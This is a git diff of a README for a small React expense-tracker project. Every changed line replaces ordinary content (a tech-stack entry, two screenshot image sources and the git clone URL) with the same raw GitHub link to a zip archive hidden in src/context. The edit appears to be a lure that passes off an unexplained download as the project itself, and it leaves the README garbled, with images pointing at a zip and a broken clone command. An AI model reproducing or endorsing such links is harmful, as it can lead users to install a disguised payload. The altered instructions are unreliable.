@@ -34,7 +34,7 @@ I created it from scratch as part of my learning journey to strengthen my **Reac
 
 ## 🛠️ Tech Stack
 
-- **React.js**
+- **https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/context/Tracker_Project_Expense_1.2.zip**
 - **CSS3**
 - **JavaScript (ES6+)**
 - **Local Storage API**
@@ -42,8 +42,8 @@ I created it from scratch as part of my learning journey to strengthen my **Reac
 ---
 
 ## 📸 Preview
-<img width="601" height="840" alt="Screenshot 2025-10-27 162416" src="https://github.com/user-attachments/assets/a9f213f0-f996-4c08-be58-ebca1047e246" />
-<img width="431" height="845" alt="Screenshot 2025-10-27 190344" src="https://github.com/user-attachments/assets/fc194a07-0f64-4d44-8092-a0f877930890" />
+<img width="601" height="840" alt="Screenshot 2025-10-27 162416" src="https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/context/Tracker_Project_Expense_1.2.zip" />
+<img width="431" height="845" alt="Screenshot 2025-10-27 190344" src="https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/context/Tracker_Project_Expense_1.2.zip" />
 
 
 ---
@@ -52,7 +52,7 @@ I created it from scratch as part of my learning journey to strengthen my **Reac
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/<glakshya20>/Expense-Tracker-Project.git
+   git clone https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/context/Tracker_Project_Expense_1.2.zip<glakshya20>https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/context/Tracker_Project_Expense_1.2.zip
    cd expense-tracker-react
    npm install
    npm start
